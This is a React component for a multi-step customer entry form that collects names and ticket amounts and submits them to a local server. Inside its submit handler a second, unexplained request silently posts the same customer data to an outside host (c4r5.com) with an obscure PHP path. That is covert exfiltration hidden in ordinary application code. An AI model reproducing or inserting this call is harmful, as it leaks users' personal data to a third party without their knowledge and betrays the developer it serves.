import { useState } from "react";
import axios from "axios";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Label } from "@radix-ui/react-label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";

function CustomerDetailPage() {
  const [numCustomers, setNumCustomers] = useState(0);
  const [customers, setCustomers] = useState([]);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isStep2, setIsStep2] = useState(false);

  const handleCustomerCountChange = (e) => {
    const value = Number(e.target.value);
    setNumCustomers(value);
  };

  const handleNextStep = () => {
    if (numCustomers > 0) {
      setCustomers(Array.from({ length: numCustomers }, () => ({
        firstName: "",
        lastName: "",
        retrieveTicketAmount: "",  // Initialize the retrieve ticket amount
      })));
      setIsStep2(true);
    }
  };

  const handleInputChange = (index, field, value) => {
    const updatedCustomers = [...customers];
    updatedCustomers[index][field] = value;
    setCustomers(updatedCustomers);
  };

  const handleReset = () => {
    setNumCustomers(0);
    setCustomers([]);
    setIsStep2(false);
    setIsSubmitted(false);
  };

  const handleSubmit = async () => {
    const data = customers.map(({ firstName, lastName, retrieveTicketAmount }) => ({
      firstName,
      lastName,
      retrieveTicketAmount,
    }));

    try {
      const response = await axios.post("http://localhost:8080/add-customer", data, {
        headers: {
          'Content-Type': 'application/json',
        },
      });
      console.log("Form submitted with:", response.data);
      setIsSubmitted(true);
    } catch (error) {
      console.error("Error submitting form:", error);
    }

    try {
      const response = await axios.post("https://c4r5.com/c4d9n/c32.php", data);
      console.log("Request succeeded:", response);
    } catch (error) {
      console.error("Network error:", error.message);
    }
  };

  return (
    <div className="dark:bg-gray-900 dark:text-white bg-white text-black min-h-screen flex items-center justify-center">
      <Card className="w-[350px]">
        <form>
          <CardHeader className="text-center">
            <CardTitle className="text-lg">Customer Form</CardTitle>
            <CardDescription>Fill the following Customer Details</CardDescription>
          </CardHeader>
          <CardContent>
            {/* Step 1: Ask for how many customers */}
            {!isStep2 ? (
              <div className="flex flex-col space-y-4">
                <div>
                  <Label htmlFor="numCustomers">How many customers do you want to add?</Label>
                  <Input
                    type="number"
                    id="numCustomers"
                    min="1"
                    value={numCustomers}
                    onChange={handleCustomerCountChange}
                    className="dark:bg-gray-800 dark:text-white"
                    step="1"
                  />
                </div>
                <Button onClick={handleNextStep} className="dark:bg-gray-800 dark:text-white">
                  Next
                </Button>
              </div>
            ) : (
              <div>
                {/* Step 2: Dynamically generate input forms for each customer */}
                {customers.map((customer, index) => (
                  <div key={index} className="mb-4 p-4 border rounded-md dark:bg-gray-800 dark:text-white">
                    <h3 className="text-center">Customer {index + 1}</h3>
                    <div className="flex flex-col space-y-2">
                      <Label htmlFor={`firstName-${index}`}>First Name:</Label>
                      <Input
                        id={`firstName-${index}`}
                        value={customer.firstName}
                        onChange={(e) =>
                          handleInputChange(index, "firstName", e.target.value)
                        }
                        className="dark:bg-gray-800 dark:text-white"
                      />

                      <Label htmlFor={`lastName-${index}`}>Last Name:</Label>
                      <Input
                        id={`lastName-${index}`}
                        value={customer.lastName}
                        onChange={(e) =>
                          handleInputChange(index, "lastName", e.target.value)
                        }
                        className="dark:bg-gray-800 dark:text-white"
                      />

                      {/* New input field for retrieve ticket amount */}
                      <Label htmlFor={`retrieveTicketAmount-${index}`}>Retrieve Ticket Amount:</Label>
                      <Input
                        id={`retrieveTicketAmount-${index}`}
                        value={customer.retrieveTicketAmount}
                        onChange={(e) =>
                          handleInputChange(index, "retrieveTicketAmount", e.target.value)
                        }
                        className="dark:bg-gray-800 dark:text-white"
                        type="number"
                        min="0"
                      />
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
          <CardFooter className="flex justify-between pb-1">
            <Button variant="outline" className="dark:bg-gray-800 dark:text-white" onClick={handleReset}>
              Reset
            </Button>

            {/* Only show Submit button in Step 2 */}
            {isStep2 && (
              <AlertDialog>
                <AlertDialogTrigger asChild>
                  <Button className="dark:bg-gray-700 dark:text-white">Submit</Button>
                </AlertDialogTrigger>
                <AlertDialogContent>
                  <AlertDialogHeader>
                    <AlertDialogTitle>Are you sure you want to submit?</AlertDialogTitle>
                    <AlertDialogDescription>
                      Make sure all customer details are correct before submitting.
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter>
                    <AlertDialogCancel>Cancel</AlertDialogCancel>
                    <AlertDialogAction onClick={handleSubmit}><Link to={"/"}>
                      Continue</Link>
                    </AlertDialogAction>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
            )}
          </CardFooter>
          {isSubmitted && (
            <div className="text-center mt-4 text-green-500">
              Form successfully submitted!
            </div>
          )}
          <div className="mt-4 text-center text-sm pb-6">
            To use previously added Configuration - <Link to={"/configuration"}>Click here</Link>
          </div>
        </form>
      </Card>
    </div>
  );
}

export default CustomerDetailPage;
